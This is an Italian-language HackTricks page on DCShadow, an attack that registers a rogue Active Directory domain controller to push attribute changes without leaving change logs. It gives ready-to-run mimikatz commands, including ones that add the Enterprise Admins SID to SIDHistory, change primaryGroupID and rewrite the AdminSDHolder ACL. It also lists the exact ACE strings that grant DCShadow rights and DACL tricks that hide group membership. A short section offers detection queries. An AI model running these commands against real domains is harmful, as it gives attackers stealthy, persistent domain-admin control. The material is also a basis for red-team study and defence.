# DCShadow

{{#include ../../banners/hacktricks-training.md}}


## Informazioni di base

Registra un **nuovo Domain Controller** nell'AD e lo utilizza per **inviare attributi** (SIDHistory, SPN...) su oggetti specificati **senza lasciare alcun **log** relativo alle **modifiche**. Sono necessari i privilegi **DA** e devi trovarti all'interno del **dominio root**.\
Nota che, se utilizzi dati errati, appariranno log piuttosto compromettenti.<sup>[[2]](#references)</sup>

Per eseguire l'attacco sono necessarie 2 istanze di mimikatz. Una di esse avvierà i server RPC con privilegi SYSTEM (qui devi indicare le modifiche che vuoi eseguire), mentre l'altra istanza verrà utilizzata per inviare i valori:
```bash:mimikatz1 (RPC servers)
!+
!processtoken
lsadump::dcshadow /object:username /attribute:Description /value="My new description"
```

```bash:mimikatz2 (push) - Needs DA or similar
lsadump::dcshadow /push
```
Nota che **`elevate::token`** non funzionerà nella sessione `mimikatz1`, poiché eleva i privilegi del thread, mentre dobbiamo elevare il **privilegio del processo**.\
Puoi anche selezionare un oggetto "LDAP": `/object:CN=Administrator,CN=Users,DC=JEFFLAB,DC=local`

Puoi applicare le modifiche da un DA o da un utente con queste autorizzazioni minime:

- Nell'**oggetto del dominio**:
- _DS-Install-Replica_ (Aggiunta/Rimozione di una replica nel dominio)
- _DS-Replication-Manage-Topology_ (Gestione della topologia di replica)
- _DS-Replication-Synchronize_ (Sincronizzazione della replica)
- L'**oggetto Sites** (e i relativi elementi figlio) nel **contenitore Configuration**:
- _CreateChild and DeleteChild_
- L'oggetto del **computer registrato come DC**:
- _WriteProperty_ (non Write)
- L'**oggetto di destinazione**:
- _WriteProperty_ (non Write)

Puoi usare [**Set-DCShadowPermissions**](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1) per concedere questi privilegi a un utente senza privilegi (tieni presente che verranno lasciati alcuni log). Questo è molto più restrittivo rispetto ai privilegi DA.\
Ad esempio: `Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose` Questo significa che il nome utente _**student1**_, quando effettua l'accesso sulla macchina _**mcorp-student1**_, dispone dei permessi DCShadow sull'oggetto _**root1user**_.

## Utilizzare DCShadow per creare backdoors
```bash:Set Enterprise Admins in SIDHistory to a user
lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-1-521-280534878-1496970234-700767426-519
```

```bash:Change PrimaryGroupID (put user as member of Domain Administrators)
lsadump::dcshadow /object:student1 /attribute:primaryGroupID /value:519
```

```bash:Modify ntSecurityDescriptor of AdminSDHolder (give Full Control to a user)
#First, get the ACE of an admin already in the Security Descriptor of AdminSDHolder: SY, BA, DA or -519
(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=Admin SDHolder,CN=System,DC=moneycorp,DC=local")).psbase.ObjectSecurity.sddl
#Second, add to the ACE permissions to your user and push it using DCShadow
lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:<whole modified ACL>
```
### Abuso del gruppo primario, lacune nell'enumerazione e rilevamento

- `primaryGroupID` è un attributo separato dall'elenco `member` del gruppo. DCShadow/DSInternals possono scriverlo direttamente (ad esempio, impostare `primaryGroupID=512` per **Domain Admins**) senza l'enforcement di LSASS on-box, ma AD **sposta** comunque l'utente: la modifica del PGID rimuove sempre l'appartenenza dal gruppo primario precedente (lo stesso comportamento vale per qualsiasi gruppo di destinazione), quindi non è possibile mantenere la precedente appartenenza al gruppo primario.<sup>[[1]](#references)</sup>
- Gli strumenti predefiniti impediscono di rimuovere un utente dal gruppo primario corrente (`ADUC`, `Remove-ADGroupMember`), quindi la modifica del PGID richiede in genere scritture dirette nella directory (DCShadow/`Set-ADDBPrimaryGroup`).
- La generazione dei report sull'appartenenza è incoerente:
- **Include** i membri derivati dal gruppo primario: `Get-ADGroupMember "Domain Admins"`, `net group "Domain Admins"`, ADUC/Admin Center.
- **Omets** i membri derivati dal gruppo primario: `Get-ADGroup "Domain Admins" -Properties member`, ADSI Edit che esamina `member`, `Get-ADUser <user> -Properties memberOf`.
- I controlli ricorsivi possono non rilevare i membri del gruppo primario se il **gruppo primario è a sua volta annidato** (ad esempio, il PGID dell'utente punta a un gruppo annidato all'interno di Domain Admins); `Get-ADGroupMember -Recursive` o i filtri ricorsivi LDAP non restituiranno quell'utente a meno che la ricorsione non risolva esplicitamente i gruppi primari.
- Trucchi con le DACL: gli attacker possono **negare ReadProperty** su `primaryGroupID` dell'utente (o sull'attributo `member` del gruppo per i gruppi non protetti da AdminSDHolder), nascondendo l'appartenenza effettiva dalla maggior parte delle query PowerShell; `net group` continuerà comunque a risolvere l'appartenenza. I gruppi protetti da AdminSDHolder ripristineranno tali negazioni.

Esempi di rilevamento/monitoraggio:
```powershell
# Find users whose primary group is not the default Domain Users (RID 513)
Get-ADUser -Filter * -Properties primaryGroup,primaryGroupID |
Where-Object { $_.primaryGroupID -ne 513 } |
Select-Object Name,SamAccountName,primaryGroupID,primaryGroup
```

```powershell
# Find users where primaryGroupID cannot be read (likely denied via DACL)
Get-ADUser -Filter * -Properties primaryGroupID |
Where-Object { -not $_.primaryGroupID } |
Select-Object Name,SamAccountName
```
Esegui un cross-check dei gruppi privilegiati confrontando l'output di `Get-ADGroupMember` con `Get-ADGroup -Properties member` o ADSI Edit per individuare discrepanze introdotte da `primaryGroupID` o da attributi nascosti.<sup>[[1]](#references)</sup>

## Shadowception - Concedere permessi DCShadow usando DCShadow (nessun log dei permessi modificati)

Dobbiamo aggiungere i seguenti ACE con il SID del nostro utente alla fine:<sup>[[2]](#references)</sup>

- Sull'oggetto dominio:
- `(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
- `(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;UserSID)`
- `(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
- Sull'oggetto computer dell'attaccante: `(A;;WP;;;UserSID)`
- Sull'oggetto utente target: `(A;;WP;;;UserSID)`
- Sull'oggetto Sites nel contenitore Configuration: `(A;CI;CCDC;;;UserSID)`

Per ottenere l'ACE attuale di un oggetto: `(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=local")).psbase.ObjectSecurity.sddl`

In questo caso devi apportare **diverse modifiche**, non una sola. Nella **sessione mimikatz1** (server RPC), usa il parametro **`/stack` per ogni modifica**. Devi quindi usare **`/push`** una sola volta per applicare tutte le modifiche impilate dal server rogue.

[**Maggiori informazioni su DCShadow su ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)<sup>[[2]](#references)</sup>

## References

- [1] [TrustedSec - Avventure nel comportamento, nel reporting e nello sfruttamento di Primary Group](https://trustedsec.com/blog/adventures-in-primary-group-behavior-reporting-and-exploitation)
- [2] [Write-up di DCShadow su ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)
{{#include ../../banners/hacktricks-training.md}}
